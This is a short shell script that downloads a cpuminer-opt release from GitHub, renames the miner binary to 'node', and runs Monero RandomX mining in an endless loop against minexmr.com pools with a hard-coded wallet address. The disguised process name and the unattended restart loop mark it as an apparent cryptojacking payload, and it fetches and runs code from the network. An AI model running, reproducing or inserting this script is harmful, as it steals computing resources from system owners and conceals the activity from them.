  
#!/bin/sh
#pool1 = us-west.minexmr.com:4444/443
#pool2 = ca.minexmr.com:4444/443
#pool3 = de.minexmr.com:4444/443
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
tar -xf cpuminer-opt-linux.tar.gz 
mv cpuminer-avx node
while [ 1 ]; do
./node -a RandomX -o us-west.minexmr.com:443 -u 83qVLHdgsWhRNNFT6PQqWYRNMZ5xPQr1UDbpWiZeJEypWBh4EKco7Y6BoWjhz1x77Rii5CFtvtC3MVDwZmtcmW9H4DKkmsy.Na
sleep 5
done
